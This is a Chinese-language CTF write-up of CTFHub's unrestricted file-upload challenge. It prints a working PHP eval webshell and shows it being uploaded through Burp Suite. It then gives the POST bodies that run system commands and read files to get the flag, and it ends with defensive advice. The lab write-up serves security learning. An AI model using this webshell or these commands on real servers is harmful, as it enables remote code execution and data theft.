【CTFHub】Web-无限制 Writeup

操作者：何芊宏 | 操作日期：2026.9.19 | 分类：CTF | 标签：CTFHub, Web, 文件上传, 无限制, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / 无限制
  • 题目名称：无限制
  • 提示：服务器未对上传的文件做任何过滤，直接上传木马即可

2. 解题思路

本题是文件上传漏洞中最基础、最简单的场景。服务器没有前端校验、没有 MIME 类型校验、没有文件头校验、没有后缀黑名单/白名单。我们只需要直接上传一个纯正的 PHP 一句话木马 shell.php，然后通过 Burp Suite 执行系统命令即可获取 Flag。

3. 操作步骤

第一步：构建纯正木马

因为之前通关的木马文件已被清理，我们需要在本地重新创建一个不带任何伪装的纯正木马。

  • 在 VS Code 中新建文件，写入：<?php @eval($_POST['cmd']); ?>。
  • 保存到 muma 文件夹（杀软白名单目录），命名为 shell.php。

第二步：直接上传

  1. 开启“无限制”靶场，确保 Burp 拦截开启。
  2. 在 BP 浏览器中选择 shell.php 并提交。
  3. BP 拦截请求后，无需修改任何参数，直接点击 Forward 放行。
  4. 网页提示“上传成功”，路径为 upload/shell.php。

第三步：Repeater 连马（手动改包）

按照惯例，将请求发送至 Repeater：

  1. 修改第一行为：POST /upload/shell.php HTTP/1.1。
  2. 修改 Content-Type 为 application/x-www-form-urlencoded。
  3. 彻底清空下方所有 ------WebKitFormBoundary... 内容，写入：cmd=system("ls /");。
  4. 修改第3行 Content-Length: 19，保留空行，点击 Send。成功回显根目录列表。

第四步：搜索并读取 Flag

  1. 将请求体替换为：cmd=system("find / -name flag* 2>/dev/null");。手动计算长度，该命令长度为 45，修改 Content-Length: 45。点击 Send。
  2. 结果回显路径：/var/www/html/flag_1946812299.php。
  3. 读取 Flag（踩坑与修正）：
    首次尝试使用 print_r(file_get_contents('...')) 时，手误将函数名写成了 print_r9，导致服务器返回 syntax error。修正为正确的 PHP 原生函数：
    cmd=print_r(file_get_contents('/var/www/html/flag_1946812299.php'));
    代码总长度为 68，修改 Content-Length: 68，点击 Send。
  4. 右侧成功回显 Flag：ctfhub{0d0169bd5153e9d75ef1fed6}

4. 踩坑记录与复盘

  • 无验证环境的直接性：在没有 WAF、没有过滤的靶场中，上传 shell.php 就是最直接的攻击方式。虽然简单，但这说明在真实的安全防御中，任何环节的缺失都会导致服务器被直接 RCE（远程代码执行）。
  • HTTP 协议的肌肉记忆：即便是在最简单的环境下，修改 POST 包时仍需准确处理 Content-Length 和空行。这已经成为了每次操作的标准流程。
  • 原生函数的可靠性：再次验证了 print_r(file_get_contents(...)) 在读取文件时的高效性与稳定性。这是在多次踩坑后固化下来的最佳实践。

5. 知识总结

  • “无限制”漏洞原理：服务器未对用户上传的文件进行任何有效校验。攻击者可以直接上传 Webshell，并利用其执行系统命令、读取敏感文件，从而获取服务器权限。
  • CTF 靶场中的评分策略：此类题目虽然简单，但在实战中通常作为“送分题”或“起手式”，用于快速验证漏洞是否存在。
  • 安全防御建议：严禁上线无验证的文件上传功能。必须严格执行后缀白名单校验、MIME 校验、文件内容检测（如 getimagesize），并将上传目录设置为不可执行脚本（例如在 Nginx 中配置 location /uploads { deny all; } 或 php_admin_flag engine off）。
